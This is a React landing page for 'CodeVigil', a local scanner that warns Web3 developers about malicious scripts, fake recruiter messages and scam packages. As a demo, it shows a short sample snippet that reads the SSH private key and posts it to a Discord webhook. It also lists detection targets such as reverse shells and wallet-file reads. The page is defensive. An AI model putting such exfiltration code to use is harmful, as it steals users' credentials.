import React from 'react';
import { Shield, Skull, FileCode2, Terminal, MessageSquare, Search } from 'lucide-react';
import { Button } from '../components/ui/button';
import { Card } from '../components/ui/card';
import { Badge } from '../components/ui/badge';
import { useNavigate } from 'react-router-dom';

export default function LandingPage() {
  const navigate = useNavigate();

  return (
    <div className="landing-page pb-20">
      {/* Hero Section */}
      <section className="text-center py-20 px-4 border-b border-white/10">
        <Shield className="w-20 h-20 mx-auto mb-8 text-[#00f0ff] animate-pulse drop-shadow-[0_0_24px_rgba(0,240,255,0.4)]" />
        <h1 className="text-5xl md:text-7xl font-black mb-6 bg-gradient-to-br from-white to-[#00f0ff] bg-clip-text text-transparent">
          Don't Run That Code.
        </h1>
        <p className="text-slate-400 text-xl max-w-2xl mx-auto mb-10">
          The ultimate security platform for Web3 developers. Scan suspicious scripts, detect social engineering attacks, and report malicious actors to our community database.
        </p>
        <div className="flex justify-center gap-4">
          <Button onClick={() => navigate('/dashboard')} size="lg" className="bg-[#00f0ff] text-black hover:bg-[#00f0ff]/80 shadow-[0_0_20px_rgba(0,240,255,0.3)] text-lg h-14 px-8">
            🚀 Launch App
          </Button>
          <Button onClick={() => document.getElementById('features').scrollIntoView({behavior: 'smooth'})} variant="outline" size="lg" className="text-white border-white/20 hover:bg-white/10 text-lg h-14 px-8">
            Learn More ↓
          </Button>
        </div>
      </section>

      {/* The Problem Section */}
      <section className="py-20 px-4 bg-[#00f0ff]/[0.02]">
        <div className="max-w-4xl mx-auto">
          <h2 className="text-3xl md:text-4xl font-extrabold mb-6 text-center">Web3 is a Minefield 💣</h2>
          <p className="text-slate-400 text-lg text-center mb-12">
            Scammers are targeting developers with fake job offers, fake collaboration requests, and malicious npm packages. A single copy-paste of a script can drain your wallet, steal your SSH keys, and compromise your entire system.
          </p>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <Card className="p-6 bg-[#0a0e1a]/70 border-red-500/25 hover:border-red-500/50 hover:shadow-[0_0_24px_rgba(255,42,95,0.25)] transition-all">
              <Skull className="w-10 h-10 text-red-500 mb-4" />
              <h3 className="text-xl font-bold mb-2 text-white">Social Engineering</h3>
              <p className="text-slate-400 text-sm">Fake recruiters promising $200k+ salaries to lure you into running their "coding test" repositories.</p>
            </Card>
            <Card className="p-6 bg-[#0a0e1a]/70 border-red-500/25 hover:border-red-500/50 hover:shadow-[0_0_24px_rgba(255,42,95,0.25)] transition-all">
              <FileCode2 className="w-10 h-10 text-red-500 mb-4" />
              <h3 className="text-xl font-bold mb-2 text-white">Wallet Drainers</h3>
              <p className="text-slate-400 text-sm">Scripts silently reading your <code className="text-red-400">.metamask</code>, <code className="text-red-400">.phantom</code>, and <code className="text-red-400">.env</code> files to steal your private keys.</p>
            </Card>
            <Card className="p-6 bg-[#0a0e1a]/70 border-red-500/25 hover:border-red-500/50 hover:shadow-[0_0_24px_rgba(255,42,95,0.25)] transition-all">
              <Terminal className="w-10 h-10 text-red-500 mb-4" />
              <h3 className="text-xl font-bold mb-2 text-white">Hidden Payloads</h3>
              <p className="text-slate-400 text-sm">Obfuscated <code className="text-red-400">eval()</code> and Base64 encoded strings executing reverse shells on your machine.</p>
            </Card>
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section id="features" className="py-20 px-4 border-b border-white/10">
        <div className="max-w-5xl mx-auto">
          <h2 className="text-3xl md:text-4xl font-extrabold mb-16 text-center">How CodeVigil Protects You</h2>
          
          <div className="flex flex-col md:flex-row gap-10 items-center justify-between mb-20">
            <div className="flex-1">
              <h3 className="text-2xl font-bold mb-4">🔍 Instant Code Scanner</h3>
              <p className="text-slate-400 mb-6">Paste any JS, Python, or shell script. Our engine scans it locally against 40+ known malicious patterns. We identify code execution risks, network exfiltration, and wallet file access.</p>
              <ul className="text-slate-500 space-y-2">
                <li>✓ Detects Base64 & Hex Obfuscation</li>
                <li>✓ Flags <code className="bg-white/10 px-1 rounded">child_process</code> and Reverse Shells</li>
                <li>✓ Identifies Discord/Telegram Webhook Exfiltration</li>
              </ul>
            </div>
            <div className="flex-1 bg-[#0f1423] p-6 rounded-xl border border-white/10 shadow-lg w-full">
              <pre className="font-mono text-sm text-slate-300 overflow-x-auto">
                <span className="text-[#00f0ff]">const</span> fs = require(<span className="text-[#00fa88]">'fs'</span>);<br/>
                <span className="text-[#00f0ff]">const</span> d = fs.readFileSync(<span className="text-[#00fa88]">'~/.ssh/id_rsa'</span>);<br/>
                fetch(<span className="text-[#00fa88]">'https://discord.com/api/webhooks/...'</span>, {'{'} <br/>
                  &nbsp;&nbsp;method: <span className="text-[#00fa88]">'POST'</span>,<br/>
                  &nbsp;&nbsp;body: JSON.stringify({'{'} content: d {'}'})<br/>
                {'}'});
              </pre>
              <div className="mt-4 bg-red-500/10 border border-red-500/30 text-red-500 px-3 py-2 rounded flex items-center gap-2 text-sm">
                <span>⚠️</span> 2 CRITICAL THREATS DETECTED
              </div>
            </div>
          </div>

          <div className="flex flex-col md:flex-row-reverse gap-10 items-center justify-between mb-20">
            <div className="flex-1">
              <h3 className="text-2xl font-bold mb-4">💬 Message Analyzer</h3>
              <p className="text-slate-400 mb-6">Not sure if that Telegram DM is legit? Paste it into our Analyzer. We look for classic social engineering red flags to save you from wasting time on scammers.</p>
              <ul className="text-slate-500 space-y-2">
                <li>✓ Detects artificial urgency & pressure tactics</li>
                <li>✓ Flags unrealistic compensation ($200k+/yr)</li>
                <li>✓ Identifies requests to run unaudited code</li>
              </ul>
            </div>
            <Card className="flex-1 p-6 bg-[#0a0e1a]/70 border-white/10 w-full">
              <div className="flex gap-4">
                <MessageSquare className="w-8 h-8 text-blue-400 shrink-0" />
                <div>
                  <p className="font-bold text-white mb-1">Recruiter Bob</p>
                  <p className="text-sm text-slate-400">We are hiring for $250k/year! Please clone our repo and run <code className="bg-white/10 px-1 rounded">npm start</code> right now to complete the test.</p>
                </div>
              </div>
            </Card>
          </div>

          <div className="flex flex-col md:flex-row gap-10 items-center justify-between">
            <div className="flex-1">
              <h3 className="text-2xl font-bold mb-4">📡 Community Scam Database</h3>
              <p className="text-slate-400 mb-6">Search our crowdsourced database before engaging with a project. Look up wallet addresses, GitHub repos, and Telegram handles.</p>
              <Button onClick={() => navigate('/dashboard')} className="bg-[#b366ff] hover:bg-[#b366ff]/80 text-white border-0 shadow-[0_0_20px_rgba(179,102,255,0.3)]">
                <Search className="w-4 h-4 mr-2" />
                Search Database
              </Button>
            </div>
            <div className="flex-1 w-full flex flex-col gap-4">
              <Card className="p-4 bg-[#0a0e1a]/70 border-white/10">
                <Badge variant="outline" className="bg-orange-500/20 text-orange-400 border-orange-500/30 mb-2">HIGH</Badge>
                <p className="font-bold text-white">Fake Arbitrum Airdrop</p>
                <p className="text-xs text-slate-500 mt-2 font-mono">0x9dE2...7cF3</p>
              </Card>
              <Card className="p-4 bg-[#0a0e1a]/70 border-white/10">
                <Badge variant="outline" className="bg-red-500/20 text-red-400 border-red-500/30 mb-2 animate-pulse">CRITICAL</Badge>
                <p className="font-bold text-white">Malicious npm package (colors-js-fake)</p>
                <p className="text-xs text-slate-500 mt-2 font-mono">github.com/scammer/colors</p>
              </Card>
            </div>
          </div>

        </div>
      </section>

      {/* Footer CTA */}
      <section className="text-center py-24 px-4">
        <h2 className="text-3xl md:text-4xl font-extrabold mb-4">Ready to secure your workflow?</h2>
        <p className="text-slate-400 text-lg mb-8 max-w-2xl mx-auto">Join the community and start scanning today. It's completely free and runs 100% locally in your browser.</p>
        <Button onClick={() => navigate('/dashboard')} size="lg" className="bg-[#00f0ff] text-black hover:bg-[#00f0ff]/80 shadow-[0_0_20px_rgba(0,240,255,0.3)] text-lg h-14 px-8">
          Launch CodeVigil App
        </Button>
      </section>
    </div>
  );
}
